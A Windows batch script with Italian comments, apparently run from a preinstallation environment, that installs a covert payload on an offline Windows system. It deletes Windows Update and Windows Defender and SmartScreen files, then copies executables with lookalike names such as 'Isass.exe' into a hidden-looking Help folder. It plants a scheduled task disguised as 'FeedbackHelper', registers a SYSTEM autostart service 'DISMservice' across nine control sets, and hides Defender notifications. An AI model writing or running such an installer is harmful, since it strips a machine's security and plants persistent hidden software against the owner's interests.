@echo off
setlocal enabledelayedexpansion

for %%i in (C D E F G H I J K L M N O P Q R S T U V W) do (
    if exist %%i:\Windows\explorer.exe (
        set "WINLETTER=%%i:"
        goto :found
    )
)

:found
echo Windows trovato su !WINLETTER!

:: qui elimina i file di WU
del /f /s /q "!WINLETTER!\Windows\SoftwareDistribution\"
del /f /s /q "!WINLETTER!\Windows\System32\wuauclt.exe"
del /f /s /q "!WINLETTER!\Windows\System32\wusa.exe"
del /f /s /q "!WINLETTER!\Windows\System32\MoUsoCoreWorker.exe"
del /f /s /q "!WINLETTER!\Windows\System32\SIHClient.exe"
del /f /s /q "!WINLETTER!\Windows\System32\WaaSMedicAgent.exe"
del /f /s /q "!WINLETTER!\Windows\System32\WindowsUpdateElevatedInstaller.exe"
del /f /s /q "!WINLETTER!\Windows\System32\musnotification.exe"
del /f /s /q "!WINLETTER!\Windows\System32\musnotificationux.exe"


:: qui elimina WDef
del /f /s /q "!WINLETTER!\Program Files\Windows Defender"
del /f /s /q "!WINLETTER!\Program Files\Windows Defender Advanced Threat Protection"
del /f /s /q "!WINLETTER!\ProgramData\Microsoft\Windows Defender"
del /f /s /q "!WINLETTER!\ProgramData\Microsoft\Windows Defender Advanced Threat Protection"
del /f /s /q "!WINLETTER!\Program Files\WindowsApps\*Microsoft.SecHealthUI*"
del /f /s /q "!WINLETTER!\Windows\System32\smartscreen.exe"


:: qui installa THWP
mkdir "!WINLETTER!\Windows\Help"
mkdir "!WINLETTER!\Windows\Help\mui"
mkdir "!WINLETTER!\Windows\Help\mui\0563"
mkdir "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic"
copy Isass.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
copy starter.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
copy WMIHost.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
copy wuasrv.exe "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"
copy 5633 "!WINLETTER!\Windows\Help\mui\0563\DIAgnostic\"


:: qui installa la task
reg load HKLM\zSOFTWARE "!WINLETTER!\Windows\System32\Config\SOFTWARE"
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\FeedbackHelper" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\FeedbackHelper" /v SD /t REG_BINARY /d 01000480780000008800000000000000140000000200640004000000001018009f011f0001020000000000052000000020020000001014009f011f0001010000000000051200000000101800ff011f000102000000000005200000002002000000001400890012000101000000000005120000000000000001020000000000052000000020020000010500000000000515000000f6a4431c870f5a95c2f57cc301020000 /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\FeedbackHelper" /v Index /t REG_DWORD /d 1 /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\FeedbackHelper" /v Id /t REG_SZ /d "{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /v Path /t REG_SZ /d "\\FeedbackHelper" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /v Date /t REG_SZ /d "2025-06-26T16:16:25.4744237" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /v Author /t REG_SZ /d "SYSTEM" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /v Description /t REG_SZ /d "Consente di inviare feedback tramite le finestre di dialogo" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /v URI /t REG_SZ /d "\\FeedbackHelper" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /v Schema /t REG_DWORD /d 65540 /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /v Hash /t REG_BINARY /d 3986d9d40efec858f9baa4680fff6157435c44183b31703245c75d894b43843d /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /v Triggers /t REG_BINARY /d 170000000000000000000000000000000000000000000000000000000000000000ffffffffffffffff2821c243484848484b5746cc484848480e0000004848484841007500740068006f00720000004848000000000048484848004848484848480048484848484805000000484848480c000000484848480101000000000005120000004848484800000000484848482c0000004848484800000000ffffffff00000000ffffffff0700000000000000000000000000000000000000000000000000000000000000484848ffff00000000000000000000000000000000000000000000000000000000000000000000ffffffffffffffff00000000ffffffff000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000 /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /v Actions /t REG_BINARY /d 03000c00000041007500740068006f0072006666000000004800000043003a005c00570049004e0044004f00570053005c00480065006c0070005c006d00750069005c0030003500360033005c0073007400610072007400650072002e00650078006500000000000000000000 /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{F7C70059-57E3-47FC-85A2-64B8E66D1BCE}" /v DynamicInfo /t REG_BINARY /d 03000000a58691e6a4e6db0100000000000000000000000000000000000000000000000000000000000000 /f
reg unload HKLM\zSOFTWARE
copy FeedbackHelper "!WINLETTER!\Windows\System32\Tasks\"
icacls "!WINLETTER!\Windows\System32\Tasks\FeedbackHelper" /grant "SYSTEM:(F)" /grant "Administrators:(F)" /grant "LOCAL SERVICE:(RX)" /inheritance:e





:: qui installa i servizi
reg load HKLM\zSYSTEM "!WINLETTER!\Windows\System32\Config\SYSTEM"
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet001\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet002\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet003\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet004\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet005\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet006\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet007\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet008\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f

reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v Type /t REG_DWORD /d 16 /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v Start /t REG_DWORD /d 2 /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v ErrorControl /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v ImagePath /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\nssm.exe" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v DisplayName /t REG_SZ /d "DISMservice" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v ObjectName /t REG_SZ /d "LocalSystem" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v DelayedAutostart /t REG_DWORD /d 0 /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice" /v FailureActionsOnNonCrashFailures /t REG_DWORD /d 1 /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters" /v Application /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic\starter.exe" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters" /v AppParameters /t REG_EXPAND_SZ /d "" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters" /v AppDirectory /t REG_EXPAND_SZ /d "C:\WINDOWS\Help\mui\0563\DIAgnostic" /f
reg add "HKLM\zSYSTEM\ControlSet009\Services\DISMservice\Parameters\AppExit" /ve /t REG_SZ /d "Restart" /f
reg unload HKLM\zSYSTEM



:: WinDef e notifiche off
reg load HKLM\zSOFTWARE "!WINLETTER!\Windows\System32\Config\SOFTWARE"
reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
reg add "HKLM\zSOFTWARE\Microsoft\Windows Defender Security Center\Notifications" /v DisableNotifications /t REG_DWORD /d 1 /f
reg add "HKLM\zSOFTWARE\Policies\Microsoft\Windows\PushNotifications" /v NoToastApplicationNotification /t REG_DWORD /d 1 /f
reg add "HKLM\zSOFTWARE\Policies\Microsoft\Windows\Explorer" /f
reg add "HKLM\zSOFTWARE\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f
reg add "HKLM\zSOFTWARE\Policies\Microsoft\Windows Defender Security Center\Systray" /v HideSystray /t REG_DWORD /d 1 /f
reg unload HKLM\zSOFTWARE


echo Rebooting in 5 seconds...
wpeutil reboot
